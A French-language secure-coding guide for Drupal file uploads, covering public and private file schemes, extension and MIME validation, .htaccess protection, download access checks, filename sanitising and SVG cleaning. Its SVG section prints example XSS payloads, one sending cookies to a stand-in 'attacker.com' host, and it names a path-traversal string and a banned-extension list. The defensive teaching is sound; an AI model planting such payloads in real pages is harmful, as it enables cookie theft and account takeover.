# Sécurité des Uploads de Fichiers

## Les Risques

- **Exécution de code** : upload d'un fichier `.php` dans `public://` → accès direct par URL → RCE
- **XSS via SVG** : un SVG peut contenir du JavaScript
- **Path traversal** : `../../../etc/passwd` comme nom de fichier
- **Déni de service** : fichiers gigantesques

---

## `public://` vs `private://` — Choisir le Bon Schéma

| | `public://` | `private://` |
|--|------------|-------------|
| **Accès URL** | Direct — servi par le webserver | Via Drupal — vérifié par `hook_file_download()` |
| **Performance** | ✅ Rapide (Apache/Nginx) | ⚠️ Plus lente (PHP) |
| **Permissions** | ❌ Aucune vérification | ✅ Contrôle fin par code |
| **Use case** | Images publiques, CSS, JS | PDF confidentiels, contrats, factures |
| **Config** | `sites/default/files/` | Hors webroot — `settings.php` |

```php
// settings.php — configurer le répertoire private (HORS du webroot)
$settings['file_private_path'] = '/var/www/private';
// OU
$settings['file_private_path'] = DRUPAL_ROOT . '/../private';
// Ce dossier ne doit PAS être accessible via une URL directe
```

---

## Validation des Extensions

```php
use Drupal\file\FileInterface;

// ─────────────────────────────────────────────────────────────────────────────
// ANCIENNE API (D8/D9) — encore fonctionnelle en D10 mais deprecated en D11
// ─────────────────────────────────────────────────────────────────────────────
$form['document'] = [
  '#type'            => 'managed_file',
  '#upload_location' => 'private://documents/',
  '#upload_validators' => [
    'file_validate_extensions' => ['pdf doc docx txt'],      // string séparée par espaces
    'file_validate_size'       => [5 * 1024 * 1024],
  ],
];

// ─────────────────────────────────────────────────────────────────────────────
// NOUVELLE API (D10+ recommandée, D11 obligatoire) — noms en PascalCase
// ─────────────────────────────────────────────────────────────────────────────
$form['document'] = [
  '#type'            => 'managed_file',
  '#upload_location' => 'private://documents/',
  '#upload_validators' => [
    'FileExtension' => ['extensions' => 'pdf doc docx txt'],  // clé 'extensions'
    'FileSizeLimit' => ['fileLimit' => 5 * 1024 * 1024],      // clé 'fileLimit'
  ],
];

// Pour les images
$form['image'] = [
  '#type'            => 'managed_file',
  '#upload_location' => 'public://images/',
  '#upload_validators' => [
    'FileExtension'    => ['extensions' => 'jpg jpeg png gif webp'],
    'FileSizeLimit'    => ['fileLimit' => 2 * 1024 * 1024],
    'FileImageDimensions' => ['maxDimensions' => '2000x2000', 'minDimensions' => '100x100'],
    'FileIsImage'      => [],  // Vérifie que c'est vraiment une image
  ],
];
```

---

## Validation MIME Type — Ne pas Faire Confiance à l'Extension

Un attaquant peut renommer `malware.php` en `photo.jpg`. Valider le MIME type réel :

```php
use Drupal\Core\File\FileSystemInterface;

// Validator MIME type (D10+)
$form['fichier']['#upload_validators']['FileExtension'] = [
  'extensions' => 'jpg jpeg png gif',
];
$form['fichier']['#upload_validators']['FileMimeType'] = [];  // Valide MIME vs extension

// Validation MIME manuelle dans du code custom
function mon_module_valider_mime(FileInterface $file): array {
  $errors = [];
  $allowed_mimes = [
    'image/jpeg',
    'image/png',
    'image/gif',
    'image/webp',
    'application/pdf',
  ];

  // ⚠️ D10/D11 : la méthode guess() a été supprimée — utiliser guessMimeType()
  // (Symfony\Component\Mime\MimeTypeGuesserInterface). guess() ne fonctionne plus.
  $detected_mime = \Drupal::service('file.mime_type.guesser')->guessMimeType($file->getFileUri());

  if (!in_array($detected_mime, $allowed_mimes, TRUE)) {
    $errors[] = t('Le type de fichier @mime n\'est pas autorisé.', ['@mime' => $detected_mime]);
  }

  return $errors;
}
```

---

## Protéger `public://` contre l'Exécution PHP

Drupal génère automatiquement un `.htaccess` dans `sites/default/files/` qui bloque l'exécution PHP. **Ne jamais supprimer ce fichier.**

```apache
# sites/default/files/.htaccess — généré automatiquement par Drupal
# À vérifier qu'il est présent et correct

# Ne pas autoriser l'exécution PHP dans les dossiers de fichiers uploadés
<FilesMatch "\.php$">
  SetHandler application/octet-stream
</FilesMatch>

# Avec php-fpm
<FilesMatch "\.php$">
  Require all denied
</FilesMatch>
```

```bash
# Vérifier que le .htaccess est présent
ls -la web/sites/default/files/.htaccess

# Le régénérer si nécessaire
docker compose exec php drush php:eval "file_ensure_htaccess();"
```

---

## Contrôle d'Accès aux Fichiers Private

```php
// Dans mon_module.module

/**
 * Contrôler l'accès aux fichiers du schéma private://.
 */
function mon_module_file_download(string $uri): array|int {
  // Uniquement pour nos fichiers
  if (!str_starts_with($uri, 'private://documents/')) {
    return [];  // On ne s'en occupe pas — laisser les autres modules décider
  }

  // Charger le fichier et vérifier les droits
  $files = \Drupal::entityTypeManager()
    ->getStorage('file')
    ->loadByProperties(['uri' => $uri]);

  if (empty($files)) {
    return -1;  // Fichier non trouvé → refus
  }

  $file = reset($files);

  // Vérifier que l'utilisateur courant a accès à ce document
  $account = \Drupal::currentUser();
  if (!$account->hasPermission('download private documents')) {
    return -1;  // Accès refusé
  }

  // Permettre le téléchargement avec les bons headers
  return [
    'Content-Type'        => $file->getMimeType(),
    'Content-Disposition' => 'attachment; filename="' . $file->getFilename() . '"',
    'Cache-Control'       => 'private',
  ];
}
```

---

## Sanitiser les Noms de Fichiers

```php
use Drupal\Core\File\FileSystemInterface;

// Drupal sanitise automatiquement via FileSystem lors de l'upload
// Mais pour du code custom :

$filename = $file->getFilename();

// Supprimer les caractères dangereux
$safe_filename = preg_replace('/[^a-zA-Z0-9._\-]/', '_', $filename);

// Utiliser le service Drupal pour translittération
$transliteration = \Drupal::service('transliteration');
$safe_filename = $transliteration->transliterate($filename, 'en', '_');

// Déplacer vers un emplacement sécurisé
$destination = 'private://documents/' . $safe_filename;
$file_system = \Drupal::service('file_system');
$file_system->prepareDirectory(
  'private://documents',
  FileSystemInterface::CREATE_DIRECTORY | FileSystemInterface::MODIFY_PERMISSIONS
);
```

---

## Extensions Dangereuses à Bannir

```php
// Extensions à ne JAMAIS autoriser dans public:// ni private://
$extensions_dangereuses = [
  'php', 'php3', 'php4', 'php5', 'php7', 'phtml', 'phar',  // PHP
  'cgi', 'pl', 'py', 'rb',                                   // Autres langages serveur
  'exe', 'bat', 'sh', 'bash',                                // Exécutables
  'htaccess', 'htpasswd',                                    // Config serveur
  'svg',                                                      // SVG peut contenir JS (attention)
];

// SVG — autoriser seulement si nettoyé
// Utiliser le module SVG Sanitizer ou le service DOMPurify côté client
```

### SVG — Guide complet de sécurisation

Les SVG sont des fichiers XML — ils peuvent embarquer du JavaScript et déclencher des XSS.

**Vecteurs d'attaque SVG :**
```xml
<!-- XSS via script inline -->
<svg><script>document.cookie='stolen='+document.cookie</script></svg>

<!-- XSS via event handler -->
<svg onload="fetch('https://attacker.com?c='+document.cookie)"></svg>

<!-- XSS via image externe -->
<svg><image href="data:image/svg+xml,&lt;svg onload=alert(1)&gt;"/></svg>
```

**Solution recommandée : module `svg_sanitizer`**

```bash
composer require drupal/svg_sanitizer
docker compose exec php drush en svg_sanitizer -y
```

Ce module nettoie automatiquement les SVG uploadés via les champs Media en supprimant les balises et attributs dangereux.

**Solution manuelle si pas de module :**

```php
// Dans un hook_file_presave ou service custom
use enshrined\svgSanitize\Sanitizer;

$sanitizer = new Sanitizer();
$cleanSvg = $sanitizer->sanitize(file_get_contents($file->getFileUri()));
if ($cleanSvg === false) {
  throw new \RuntimeException('SVG invalide ou malveillant');
}
file_put_contents($file->getFileUri(), $cleanSvg);
```

```bash
# Dépendance PHP pour la sanitization
composer require enshrined/svg-sanitize
```

**Checklist SVG :**
- [ ] Module `svg_sanitizer` installé si SVG autorisés
- [ ] Attributs `onload`, `onerror`, `onclick` bloqués
- [ ] Balise `<script>` bloquée
- [ ] `<use href="...">` limité aux ressources internes
- [ ] SVG servis depuis `private://` si contenu confidentiel
- [ ] `Content-Type: image/svg+xml` avec `X-Content-Type-Options: nosniff`

---

## Checklist Sécurité Upload

```bash
# Vérifier la config des champs fichier
docker compose exec php drush php:eval "
  \$fields = \Drupal::entityTypeManager()->getStorage('field_config')->loadMultiple();
  foreach (\$fields as \$field) {
    if (in_array(\$field->getType(), ['file', 'image'])) {
      \$settings = \$field->getSettings();
      echo \$field->id() . ': ' . \$settings['uri_scheme'] . '\n';
    }
  }
"

# Vérifier que le .htaccess est présent
ls -la web/sites/default/files/.htaccess

# Vérifier les permissions des dossiers
ls -la web/sites/default/files/

# Vérifier que le répertoire private est hors du webroot
cat web/sites/default/settings.php | grep file_private_path
```
